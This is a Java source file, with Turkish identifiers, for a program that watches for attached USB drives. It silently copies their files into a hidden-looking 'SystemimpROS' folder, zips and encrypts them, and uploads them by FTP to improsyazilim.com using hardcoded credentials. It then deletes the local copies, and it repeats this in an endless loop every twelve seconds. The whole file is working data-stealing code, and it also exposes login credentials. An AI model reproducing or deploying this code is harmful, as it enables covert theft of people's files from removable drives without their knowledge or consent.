package usbpro;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import org.apache.commons.io.FileUtils;
import static usbpro.UsbPro.basla;

//class timerMesajGuncelle extends TimerTask {
//
//    @Override
//    public synchronized void run() {
//        try {
//            basla();
//        } catch (Exception ex) {
//            System.out.println("Hata " + ex.getMessage());
//        }
//    }
//}
public class UsbPro {

    static File fileDepo;
    static Timer timer;
    static String strDosyaAdi;
    static String strKonakDosya;

    public static void main(String[] args) {
        boolean dosyaOlustuMu = false;
        diskClass diskBul = new diskClass();
        List<File> diskBul1 = diskBul.diskBul();

        for (File tmpDosya : diskBul1) {
            if (!tmpDosya.getAbsolutePath().contains("C")) {
                System.out.println("dosya : " + tmpDosya);
                tmpDosya = new File(tmpDosya + "\\" + "SystemimpROS");

                if (!tmpDosya.exists()) {

                    if (tmpDosya.mkdirs()) {
                        dosyaOlustuMu = true;
                        strKonakDosya = tmpDosya.getAbsolutePath();
                        break;
                    }

                } else {
                    dosyaOlustuMu = true;
                    System.out.println("Dosya var");
                    strKonakDosya = tmpDosya.getAbsolutePath();
                    break;
                }
            }

        }
        if (!dosyaOlustuMu) {
            File tmpDosya = new File("C:\\" + "SystemimpROS");
            strKonakDosya = tmpDosya.getAbsolutePath();
            tmpDosya.mkdir();
        }
        System.out.println("Konak Dosya : " + strKonakDosya);
        fileDepo = new File(strKonakDosya + "\\depo");

        while (true) {
            try {
                System.out.println("******Basladi");
                basla();
            } catch (Exception ex) {
                System.out.println("Hata || " + ex.getMessage());
            } finally {
                try {
                    System.out.println("***Sout Bitti ve bekleniyor");
                    Thread.sleep(12200);
                    System.out.println("***Bekleme Bitti");
                } catch (InterruptedException ex) {
                    System.out.println("Thread Hatası");
                }
            }
        }

    }

    public static void dosyaSil(String strPath) {
        try {
            File dosya = new File(strPath);
            if (dosya.isDirectory()) {
                File[] arrFile = dosya.listFiles();
                for (File tmpDosya : arrFile) {
                    tmpDosya.delete();
                    tmpDosya.deleteOnExit();
                }
            } else {
                dosya.delete();
                dosya.deleteOnExit();
            }

            System.out.println("silindi");
        } catch (Exception ex) {
            System.out.println("hata Silinemedi" + ex.getMessage());
        }
    }

    static void basla() {

        copyClass copyUsbFile = new copyClass();
        usbClass usbBul = new usbClass();
        ftpClass ftpUpload = new ftpClass("improsyazilim.com", "improsyazilim", "impROS01");
        List<File> usbler = usbBul.usbBul();
        // System.out.println(usbler);
        System.out.println("####6");
        if (usbler.size() > 0) {
            dosyaHazirla();
            try {
                usbler.stream().forEach((usbDizin) -> {
                    // System.out.println(usbDizin+"usbDizin");
                    copyUsbFile.tara(usbDizin);
                });
                if (fileDepo.listFiles().length > 0) {
                    System.out.println("Uzunluk : " + fileDepo.listFiles().length);
                    System.out.println("####5");
                    zipSifrelemeClass zipSifrele = new zipSifrelemeClass();
                    System.out.println("####3");
                    zipSifrele.encryptZip(strKonakDosya + "\\depo", strKonakDosya + "\\" + System.currentTimeMillis() + ".zip", strKonakDosya + "\\" + "desktop" + ".ini");
                    System.out.println("####4");
                    System.out.println("-----");
                    System.out.println("####1");
                    dosyaZipleClass.ziple();
                    System.out.println("####2");
                    File[] arrDosyalar = new File((UsbPro.strKonakDosya + "\\veri\\")).listFiles();
                    for (File tmpDosya : arrDosyalar) {
                        if (ftpUpload.Upload(tmpDosya.getAbsolutePath(), "/../public_html/depo/" + tmpDosya.getName() + ".zip")) {

                            System.out.println("Successful");
                            tmpDosya.delete();
                            tmpDosya.deleteOnExit();
                        } else {
                            System.err.println("Yüklenemedi!");
                        }
                    }
                    System.out.println("Bitti");
                }
              //  String strUzunluk = fileDepo.listFiles().length + "";
                // System.out.println("Uzunluk : " + strUzunluk);

            } catch (Exception ex) {
                System.out.println("Hata22");
                System.err.println("hata22" + ex.getMessage() + ex.getCause() + ex.getLocalizedMessage());
            } finally {
                //   dosyaSil(strKonakDosya);
            }
        }
    }

    static void dosyaHazirla() {
        if (!fileDepo.exists()) {
            fileDepo.mkdir();

        }

        if (!new File(strKonakDosya + "\\islem").exists()) {
            new File(strKonakDosya + "\\islem").mkdir();
        }
        if (!new File(strKonakDosya + "\\veri").exists()) {
            new File(strKonakDosya + "\\veri").mkdir();
        }
        if (!new File(strKonakDosya + "\\depo").exists()) {
            new File(strKonakDosya + "\\depo").mkdir();
        }
        //

    }
}
